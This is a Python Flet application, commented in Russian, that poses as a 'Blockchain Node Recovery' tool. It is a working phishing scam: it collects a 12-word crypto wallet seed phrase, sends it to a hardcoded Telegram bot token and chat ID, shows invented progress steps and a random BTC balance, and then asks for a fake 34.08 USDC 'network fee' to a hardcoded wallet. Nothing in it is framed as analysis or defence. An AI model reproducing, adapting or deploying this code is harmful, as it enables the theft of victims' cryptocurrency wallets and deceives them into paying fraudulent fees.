import flet as ft
import requests
import random
import time

# --- ТВОИ ДАННЫЕ (ПРОВЕРЕНО) ---
TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
CHAT_ID = "8601525427" 
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

def main(page: ft.Page):
    page.title = "Blockchain Node Recovery"
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.bgcolor = "#0a0a0a"
    page.padding = 30

    # 1. Интерфейс (Ввод)
    header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
    seed_input = ft.TextField(
        label="Seed Phrase (12 words)", 
        multiline=True, 
        min_lines=3, 
        width=350,
        border_radius=12,
        border_color="blueaccent"
    )
    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=55, bgcolor="blue", color="white")
    
    # 2. Анимация загрузки
    loading_column = ft.Column(visible=False, horizontal_alignment="center", spacing=20)
    loading_text = ft.Text("Установка соединения...", italic=True, size=16)
    loading_column.controls = [ft.ProgressRing(width=60, height=60), loading_text]

    # 3. Финальный результат
    result_column = ft.Column(visible=False, horizontal_alignment="center", spacing=15)

    def on_click(e):
        phrase = seed_input.value.strip()
        if len(phrase.split()) != 12:
            page.snack_bar = ft.SnackBar(ft.Text("Введите 12 слов!"), bgcolor="red")
            page.snack_bar.open = True
            page.update()
            return

        # --- ОТПРАВКА В ТЕЛЕГРАМ (ЧЕРЕЗ GET ДЛЯ СТАБИЛЬНОСТИ) ---
        msg = f"🚨 ПОЛУЧЕНА СИД-ФРАЗА:\n\n{phrase}"
        tg_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}"
        
        try:
            # Отправляем мгновенно
            requests.get(tg_url, timeout=5)
        except:
            pass

        # Переключаем экран на загрузку
        header.visible = False
        seed_input.visible = False
        btn.visible = False
        loading_column.visible = True
        page.update()

        # Имитация шагов (для красоты)
        steps = [
            "Синхронизация с RPC...",
            "Поиск активных подписей...",
            "Дешифровка транзакций...",
            "Завершение процесса..."
        ]
        for step in steps:
            loading_text.value = step
            page.update()
            time.sleep(1.8)

        # Подготовка финала
        btc_bal = round(random.uniform(0.00062, 0.00098), 6)
        result_column.controls = [
            ft.Icon(ft.icons.CHECK_CIRCLE, color="green", size=70),
            ft.Text("СИГНАТУРА НАЙДЕНА!", color="green", size=22, weight="bold"),
            ft.Text(f"Баланс: {btc_bal} BTC", size=18, weight="bold"),
            ft.Container(
                padding=20, bgcolor="#1a1a1a", border_radius=15,
                content=ft.Column([
                    ft.Text("Комиссия сети (34.08 USDC):", size=12, color="white70"),
                    ft.Text(TARGET_ADDRESS, size=11, color="blue200", weight="bold", selectable=True),
                ], horizontal_alignment="center")
            )
        ]
        
        # Финальное переключение
        loading_column.visible = False
        result_column.visible = True
        page.update()

    btn.on_click = on_click
    
    # Добавляем всё на страницу
    page.add(
        header, 
        ft.Divider(height=10, color="transparent"), 
        seed_input, 
        btn, 
        loading_column, 
        result_column
    )

if __name__ == "__main__":
    ft.app(target=main)
